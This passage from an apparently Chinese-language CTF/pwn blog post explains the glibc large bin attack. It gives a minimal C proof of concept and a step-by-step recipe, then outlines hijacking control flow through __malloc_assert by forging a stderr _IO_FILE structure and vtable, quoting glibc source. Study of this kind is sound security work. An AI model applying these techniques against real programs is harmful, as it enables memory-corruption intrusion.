    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>

    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x500</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>   
<span class="p">}</span>
</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2024/12/12/675ae050022e3.png" alt="Screenshot 2024-12-12 210547.png"/></p> <h5 id="给大们画一个-但是手太僵了">   给大🔥们画一个, 但是手太僵了</h5> <p><img src="https://www.helloimg.com/i/2024/12/12/675ae05088772.jpg" alt="扫描全能王 2024-12-12 21.02.jpg"/></p> <h5 id="由fd-bk-连接起了全部chunk和main_arena-这也是gdb上展示的顺序">   由<code class="language-plaintext highlighter-rouge">fd, bk</code>, 连接起了全部chunk和<code class="language-plaintext highlighter-rouge">main_arena</code>, 这也是gdb上展示的顺序<br/></h5> <h5 id="其次fd_nextsize-bk_nextsize-只有每一组大小相同的chunks中的第一个才有这两个内容-并且不连接main_arena">   其次<code class="language-plaintext highlighter-rouge">fd_nextsize, bk_nextsize</code>, 只有每一组大小相同的chunks中的第一个才有这两个内容, 并且不连接<code class="language-plaintext highlighter-rouge">main_arena</code><br/></h5> <h5 id="特别地-当一个bin中只有两组不同大小的chunks时-一个组的fd_nextsize-bk_nextsize都指向另一组因为双向链表-只有一组时-这对指针都会指向自己">   特别地, 当一个bin中只有两组不同大小的chunks时, 一个组的<code class="language-plaintext highlighter-rouge">fd_nextsize, bk_nextsize</code>都指向另一组(因为双向链表); 只有一组时, 这对指针都会指向自己</h5> <h5 id="fd_nextsize-bk_nextsize是专门用于管理同一个large-bin中不同大小的chunk的排列的-这一组指针和上一组不同-并不会连接main_arena">   <code class="language-plaintext highlighter-rouge">fd_nextsize, bk_nextsize</code>是专门用于管理同一个large bin中不同大小的chunk的排列的, 这一组指针和上一组不同, 并不会连接<code class="language-plaintext highlighter-rouge">main_arena</code><br/></h5> <h5 id="large-bin-attack主要攻击的是fd_nextsize-bk_nextsize这一组指针">   large bin attack主要攻击的是<code class="language-plaintext highlighter-rouge">fd_nextsize, bk_nextsize</code>这一组指针</h5> <h5 id="-看一段glibc源码">    看一段glibc源码</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">size</span> <span class="o">==</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">fwd</span><span class="p">)){</span>
    <span class="cm">/* Always insert in the second position.  */</span>
    <span class="c1">/// 当存在一个chunk的size与victim一致</span>
    <span class="n">fwd</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
<span class="k">else</span><span class="p">{</span>
        <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
        <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="n">fwd</span><span class="p">))</span>
            <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"malloc(): largebin double linked list corrupted (nextsize)"</span><span class="p">);</span>
        <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
        <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
<span class="p">}</span>
    <span class="n">bck</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">fwd</span><span class="p">)</span>
        <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"malloc(): largebin double linked list corrupted(bk)"</span><span class="p">);</span>
<span class="p">}</span>

</code></pre></div></div> <h5 id="有问题的语句在victim-bk_nextsize--fwd-bk_nextsize和victim-bk_nextsize-fd_nextsize--victim-即当找不到一个相同size的chunk-目标victim必须生成一对nextsize-来管理它自己size大小的large-chunks-问题在于缺少对于fwd-bk_nextsize的检查-它实际上有可能被篡改为其他地址">   有问题的语句在<code class="language-plaintext highlighter-rouge">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize</code>和<code class="language-plaintext highlighter-rouge">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code>, 即当找不到一个相同size的chunk, 目标victim必须生成一对<code class="language-plaintext highlighter-rouge">nextsize</code>, 来管理它自己size大小的large chunks, 问题在于缺少对于<code class="language-plaintext highlighter-rouge">fwd-&gt;bk_nextsize</code>的检查, 它实际上有可能被篡改为其他地址<br/></h5> <h5 id="现给出一个实现该large-bin-attack的最小利用">   现给出一个实现该large bin attack的最小利用</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="c1">/// @note 假设我们需要将一个堆地址写到a[4]的位置</span>

<span class="kt">size_t</span> <span class="n">a</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="o">*</span><span class="n">p1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x420</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">p2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x410</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span>

    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x440</span><span class="p">);</span> <span class="c1">// clear unsorted bins</span>

    <span class="n">p1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="c1">// largebin.bk_nextsize = target - 0x20</span>

    <span class="n">free</span><span class="p">(</span><span class="n">p2</span><span class="p">);</span>
    
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x440</span><span class="p">);</span> <span class="cm">/* clear unsorted bins
                    * and trigger the attack
                    */</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="p13--a0之后-bk_nextsize变成了a0的形状">   <code class="language-plaintext highlighter-rouge">p1[3] = &amp;a[0]</code>之后, <code class="language-plaintext highlighter-rouge">bk_nextsize</code>变成了<code class="language-plaintext highlighter-rouge">&amp;a[0]</code>的形状</h5> <p><img src="https://www.helloimg.com/i/2024/12/12/675aea0dc26bf.png" alt="Screenshot 2024-12-12 214851.png"/></p> <h5 id="第二个malloc0x440之后-触发了attack">   第二个<code class="language-plaintext highlighter-rouge">malloc(0x440)</code>之后, 触发了attack</h5> <p><img src="https://www.helloimg.com/i/2024/12/12/675aea0dcd486.png" alt="Screenshot 2024-12-12 214925.png"/></p> <h5 id="检查a4-发现确实篡改-并且堆地址是">   检查<code class="language-plaintext highlighter-rouge">a[4]</code>, 发现确实篡改, 并且堆地址是</h5> <p><img src="https://www.helloimg.com/i/2024/12/12/675aea0dc1da0.png" alt="Screenshot 2024-12-12 215003.png"/></p> <h5 id="具体发生了什么-请看png">   具体发生了什么, 请看PNG</h5> <p><img src="https://www.helloimg.com/i/2024/12/12/675aef54cb20d.jpg" alt="扫描全能王 2024-12-12 22.11.jpg"/></p> <h5 id="所以不难总结出部署一次largebin-attack的方法">   所以不难总结出部署一次largebin attack的方法:</h5> <h5 id="1准备一个chunk1-free掉-它将作为之后源码中的fwd2申请一个比chunk1大的堆块-chunk1就被放在large-bin中3uaf或者堆溢出-修改chunk1的bk_nextsize为你指定的地址target的低0x10-即target---0x204申请一个chunk2-它比chunk1小-但是应该被放在同一个bin-free它-作为源码中的victim存在5重复2所做的事-这会触发largebin-attack-并在target位置写上victim的chunkhead的地址">    1.准备一个chunk1, free掉, 它将作为之后源码中的<code class="language-plaintext highlighter-rouge">fwd</code><br/>    2.申请一个比chunk1大的堆块, chunk1就被放在large bin中<br/>    3.UAF或者堆溢出, 修改chunk1的<code class="language-plaintext highlighter-rouge">bk_nextsize</code>为你指定的地址target的低0x10, 即<code class="language-plaintext highlighter-rouge">target - 0x20</code><br/>    4.申请一个chunk2, 它比chunk1小, 但是应该被放在同一个bin, free它, 作为源码中的<code class="language-plaintext highlighter-rouge">victim</code>存在<br/>    5.重复2所做的事, 这会触发largebin attack, 并在<code class="language-plaintext highlighter-rouge">target</code>位置写上<code class="language-plaintext highlighter-rouge">victim</code>的chunkhead的地址</h5> <h3 id="__malloc_assert劫持控制流">__malloc_assert劫持控制流</h3> <h4 id="劫持路径"> 劫持路径</h4> <h5 id="__malloc_assert是一个用于判断堆分配请求是否合理的函数-有许多方式来触发这个函数-选取其中最简单的方法-使用某种手法来修改top-chunk的chunksize位-使得它小于之后要申请的chunk的大小-注意这里与house-of-orange相反-我们需要让修改后的-chunksize_nomasksize--chunk_head不与内存页对齐-从而触发异常-__malloc_assert会尝试将错误信息输入到stderr这个输入的过程的调用过程如下">   <code class="language-plaintext highlighter-rouge">__malloc_assert</code>是一个用于判断堆分配请求是否合理的函数, 有许多方式来触发这个函数; <br/>   选取其中最简单的方法, 使用某种手法来修改top chunk的chunksize位, 使得它小于之后要申请的chunk的大小, 注意这里与house of orange相反, 我们需要让修改后的 <code class="language-plaintext highlighter-rouge">chunksize_nomask(size) + &amp;chunk_head</code>不与内存页对齐, 从而触发异常. <code class="language-plaintext highlighter-rouge">__malloc_assert</code>会尝试将错误信息输入到<code class="language-plaintext highlighter-rouge">stderr</code><br/>   这个输入的过程的调用过程如下</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__malloc_assert</span><span class="p">()</span> <span class="o">--</span><span class="p">(</span><span class="n">assert</span> <span class="nb">false</span><span class="p">)</span><span class="o">--&gt;</span> <span class="n">__fxprintf</span> <span class="o">----&gt;</span> <span class="n">vfxprintf</span><span class="p">()</span> <span class="o">----&gt;</span> <span class="n">locked_vfxprintf</span><span class="p">()</span> <span class="o">----&gt;</span> <span class="n">__vfprintf_internal</span><span class="p">()</span> <span class="o">----&gt;</span> <span class="n">_IO_file_xsputn</span><span class="p">()</span>
</code></pre></div></div> <h5 id="一路到最后-函数尝试调用了_io_file_xputsn-而这个函数正好是通过_io_file_plus结构体中的vtable加上偏移计算的-这就给了我们篡改的机会">   一路到最后, 函数尝试调用了<code class="language-plaintext highlighter-rouge">_IO_file_xputsn()</code>, 而这个函数正好是通过<code class="language-plaintext highlighter-rouge">_IO_file_plus</code>结构体中的vtable加上偏移计算的, 这就给了我们篡改的机会,</h5> <p><a href="https://www.helloimg.com/i/2024/12/13/675b91b714ab9.png"><img src="https://www.helloimg.com/i/2024/12/13/675b91b714ab9.png" alt="Screenshot 2024-12-13 094514.png"/></a></p> <h5 id="下面的_io_file_jumps就是被查询的虚表-关注在__xsputn下方0x10偏移处的__seekoff">   下面的<code class="language-plaintext highlighter-rouge">_IO_file_jumps</code>就是被查询的虚表, 关注在<code class="language-plaintext highlighter-rouge">__xsputn</code>下方0x10偏移处的<code class="language-plaintext highlighter-rouge">__seekoff</code><br/></h5> <h5 id="-下面是seekoff的源码-省去不重要的信息-发现在return之前会调用_io_switch_to_wget_modefp-这里的fp毫无疑问应该是stderr">    下面是seekoff的源码, 省去不重要的信息, 发现在return之前会调用<code class="language-plaintext highlighter-rouge">_IO_switch_to_wget_mode(fp)</code>, 这里的<code class="language-plaintext highlighter-rouge">fp</code>毫无疑问应该是<code class="language-plaintext highlighter-rouge">stderr</code></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_IO_wfile_seekoff</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="n">off64_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dir</span><span class="p">,</span> <span class="kt">int</span> <span class="n">mode</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">off64_t</span> <span class="n">result</span><span class="p">;</span>
  <span class="n">off64_t</span> <span class="n">delta</span><span class="p">,</span> <span class="n">new_offset</span><span class="p">;</span>
  <span class="kt">long</span> <span class="kt">int</span> <span class="n">count</span><span class="p">;</span>

    <span class="c1">///@warning 这里的mode和下面的must_be_exact需要想办法绕过</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">mode</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">do_ftell_wide</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>

  <span class="kt">int</span> <span class="n">must_be_exact</span> <span class="o">=</span> <span class="p">((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span>
            <span class="o">==</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
               <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span>
               <span class="o">==</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">));</span>

  <span class="n">bool</span> <span class="n">was_writing</span> <span class="o">=</span> <span class="p">((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span>
		       <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
		      <span class="o">||</span> <span class="n">_IO_in_put_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">));</span>


  <span class="k">if</span> <span class="p">(</span><span class="n">was_writing</span> <span class="o">&amp;&amp;</span> <span class="n">_IO_switch_to_wget_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
<span class="p">......</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="_io_switch_to_wget_mode-又到了_io_woverflow">   <code class="language-plaintext highlighter-rouge">_IO_switch_to_wget_mode</code>, 又到了<code class="language-plaintext highlighter-rouge">_IO_WOVERFLOW()</code>,</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_IO_switch_to_wget_mode</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">((</span><span class="kt">wint_t</span><span class="p">)</span><span class="n">_IO_WOVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">WEOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">WEOF</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">...</span>
    <span class="p">...</span>
    <span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="_io_woverflow的汇编-注意-37-位置的call指令-只要能够控制rax-就可以劫持控制流了finally">   <code class="language-plaintext highlighter-rouge">_IO_WOVERFLOW()</code>的汇编, 注意 +37 位置的call指令, 只要能够控制<code class="language-plaintext highlighter-rouge">rax</code>, 就可以劫持控制流了(finally!)</h5> <p><img src="https://www.helloimg.com/i/2024/12/13/675b9615d8209.png" alt="Screenshot 2024-12-13 100413.png"/></p> <h5 id="现在需要知道rax在call之前是如何赋值的-由于rdi始终没有变-所以以rdi作为基准-rdx--rdi--0xc0-rax--rdi--0xa0--0xe0-rsi--0xffffffff-根据blog-httpsxzaliyuncomt13016time__1311gqmhbkykgiqgx0hq1duwxgcwv2xtdpydtoc-5-这里的rdi实际上是一个堆地址">   现在需要知道<code class="language-plaintext highlighter-rouge">rax</code>在call之前是如何赋值的, 由于rdi始终没有变, 所以以rdi作为基准, <code class="language-plaintext highlighter-rouge">rdx = rdi + 0xc0; rax = rdi + 0xa0 + 0xe0; rsi = 0xffffffff</code>, 根据blog https://xz.aliyun.com/t/13016?time__1311=GqmhBKYKGIqGx0HQ1DuWxgCWv2xTDpYD#toc-5, 这里的rdi实际上是一个堆地址<br/></h5> <h5 id="有一点不一样-就是上面blog中的_io_woverflow的源码没有mov-esi-0xffffffff-笔者glibc版本235-所以在此情况之下-实际上只能向call指令的函数传一个有效的参数rdi-对此-可以使用setcontext这个gadget-因为它主要使用rdx和偏移来设置其他寄存器-而rdx是可以被控制的">   有一点不一样, 就是上面blog中的<code class="language-plaintext highlighter-rouge">_IO_WOVERFLOW()</code>的源码没有<code class="language-plaintext highlighter-rouge">mov esi, 0xffffffff</code>, (笔者glibc版本2.35), 所以在此情况之下, 实际上只能向call指令的函数传一个有效的参数(rdi). 对此, 可以使用<code class="language-plaintext highlighter-rouge">setcontext</code>这个gadget, 因为它主要使用rdx和偏移来设置其他寄存器, 而rdx是可以被控制的<br/></h5> <h5 id="总而言之-需要将原本的stderr的地址修改为可控的一大块数据通过largebin-attack-然后将其中的_io_file_jumps虚表-改为该虚表--0x10-的值-然后触发__malloc_assert">   总而言之, 需要将原本的stderr的地址修改为可控的一大块数据(通过largebin attack), 然后将其中的<code class="language-plaintext highlighter-rouge">_IO_file_jumps</code>虚表, 改为<code class="language-plaintext highlighter-rouge">该虚表 + 0x10 的值</code>, 然后触发<code class="language-plaintext highlighter-rouge">__malloc_assert</code></h5> <h4 id="-伪造_io_file结构体">  伪造_IO_FILE结构体</h4> <h5 id="从上面的分析来看-完成劫持需要制造错误的vtable偏移-需要绕过mode-must_be_exact-was_writing的检查-这些内容可以通过通过伪造一个假的_io_file_complete结构体-在把原本的stderr用这个假的替换-即可满足所以这里有必要了解一下_io_file等结构体的结构">   从上面的分析来看, 完成劫持需要制造错误的vtable偏移, 需要绕过mode, must_be_exact, was_writing的检查, 这些内容可以通过通过伪造一个假的_IO_FILE_complete结构体, 在把原本的stderr用这个假的替换, 即可满足<br/>   所以这里有必要了解一下_IO_FILE等结构体的结构<br/></h5> <h5 id="首先是_io_file结构体-内容比较多-但主要关注于前面8个指针-它们和绕过检查有关中间的_io_backup_base-似乎一些手法可能会用得到-但不是这里然后是chain结构体-用来连接其他的结构体-比如stderr会连接stdout上文的图中">   首先是_IO_FILE结构体, 内容比较多, 但主要关注于前面8个指针, 它们和绕过检查有关<br/>   中间的<code class="language-plaintext highlighter-rouge">_IO_backup_base</code>, 似乎一些手法可能会用得到, 但不是这里<br/>   然后是<code class="language-plaintext highlighter-rouge">chain</code>结构体, 用来连接其他的结构体, 比如stderr会连接stdout(上文的图中)</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_FILE</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>		<span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>

  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_ptr</span><span class="p">;</span>	<span class="cm">/* Current read pointer */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_end</span><span class="p">;</span>	<span class="cm">/* End of get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_base</span><span class="p">;</span>	<span class="cm">/* Start of putback+get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_base</span><span class="p">;</span>	<span class="cm">/* Start of put area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_ptr</span><span class="p">;</span>	<span class="cm">/* Current put pointer. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_end</span><span class="p">;</span>	<span class="cm">/* End of put area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_base</span><span class="p">;</span>	<span class="cm">/* Start of reserve area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_end</span><span class="p">;</span>	<span class="cm">/* End of reserve area. */</span>

  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>

  <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>

  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>

  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
  <span class="n">__off_t</span> <span class="n">_old_offset</span><span class="p">;</span> <span class="cm">/* This used to be _offset but it's too small.  */</span>

  <span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span>
  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

  <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
<span class="cp">#ifdef _IO_USE_OLD_IO_FILE
</span><span class="p">};</span>
</code></pre></div></div> <h5 id="然后是_io_file_complete结构体-是_io_file的加长版-关注_wide_data指针-和绕过检查有关系">   然后是<code class="language-plaintext highlighter-rouge">_IO_FILE_complete</code>结构体, 是<code class="language-plaintext highlighter-rouge">_IO_FILE</code>的加长版, 关注<code class="language-plaintext highlighter-rouge">_wide_data</code>指针, 和绕过检查有关系</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_FILE_complete</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="n">_file</span><span class="p">;</span>
<span class="cp">#endif
</span>  <span class="n">__off64_t</span> <span class="n">_offset</span><span class="p">;</span>
  <span class="cm">/* Wide character stream stuff.  */</span>
  <span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="o">*</span><span class="n">_codecvt</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_wide_data</span> <span class="o">*</span><span class="n">_wide_data</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_freeres_list</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">_freeres_buf</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">__pad5</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_mode</span><span class="p">;</span>
  <span class="cm">/* Make sure we don't get into trouble again.  */</span>
  <span class="kt">char</span> <span class="n">_unused2</span><span class="p">[</span><span class="mi">15</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">-</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)];</span>
<span class="p">};</span>
</code></pre></div></div> <h5 id="_io_file_plus结构体-在_io_file基础上加入一个vtable指针虚表指针-虚表指针中存放的是io相关的操作函数其次-注意上面源代码中的ifdef宏定义-_io_file_plus中的_io_file也可以指的是_io_file_complete结构体">   <code class="language-plaintext highlighter-rouge">_IO_FILE_PLUS</code>结构体, 在<code class="language-plaintext highlighter-rouge">_IO_FILE</code>基础上加入一个vtable指针(虚表指针), 虚表指针中存放的是IO相关的操作函数<br/>   其次, 注意上面源代码中的<code class="language-plaintext highlighter-rouge">#ifdef</code>宏定义, <code class="language-plaintext highlighter-rouge">_IO_FILE_PLUS</code>中的<code class="language-plaintext highlighter-rouge">_IO_FILE</code>也可以指的是<code class="language-plaintext highlighter-rouge">_IO_FILE_COMPLETE</code>结构体</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_FILE_plus</span>
<span class="p">{</span>
  <span class="n">_IO_FILE</span> <span class="n">file</span><span class="p">;</span>
  <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div> <h5 id="具体是那种结构-猜测可能与使用的文件open函数有关-但是没试过-无论如何-要伪造的stderr是_io_file_complete--vtable-的样式此外-在libc中存在一个指向_io_file_plus结构体的_io_list_all指针-通常情况下指向_io_2_1_stderr-然后stderr又通过chain指向stdout-stdout指向stdin当出现了新的文件描述符-会插入到这个链表的头部">   具体是那种结构, 猜测可能与使用的文件open函数有关, 但是没试过. 无论如何, 要伪造的stderr是<code class="language-plaintext highlighter-rouge">_IO_FILE_COMPLETE + vtable</code> 的样式<br/>   此外, 在libc中存在一个指向<code class="language-plaintext highlighter-rouge">_IO_FILE_plus</code>结构体的<code class="language-plaintext highlighter-rouge">_IO_list_all</code>指针, 通常情况下指向<code class="language-plaintext highlighter-rouge">_IO_2_1_stderr</code>, 然后stderr又通过chain指向stdout, stdout指向stdin<br/>   当出现了新的文件描述符, 会插入到这个链表的头部<br/></h5> <h5 id="_io_jump_t结构体-有许多操作函数-但是不同的_io_file_plus-可能会使用不同的虚表-stderrstdoutstdin使用的是_io_file_jumps">   <code class="language-plaintext highlighter-rouge">_IO_jump_t</code>结构体, 有许多操作函数, 但是不同的<code class="language-plaintext highlighter-rouge">_IO_FILE_PLUS</code>, 可能会使用不同的虚表, stderr/stdout/stdin使用的是<code class="language-plaintext highlighter-rouge">_IO_file_jumps</code></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_jump_t</span>
<span class="p">{</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy2</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_finish_t</span><span class="p">,</span> <span class="n">__finish</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">,</span> <span class="n">__overflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__underflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__uflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">,</span> <span class="n">__pbackfail</span><span class="p">);</span>
    <span class="cm">/* showmany */</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsputn_t</span><span class="p">,</span> <span class="n">__xsputn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsgetn_t</span><span class="p">,</span> <span class="n">__xsgetn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekoff_t</span><span class="p">,</span> <span class="n">__seekoff</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekpos_t</span><span class="p">,</span> <span class="n">__seekpos</span><span class="p">);</span>
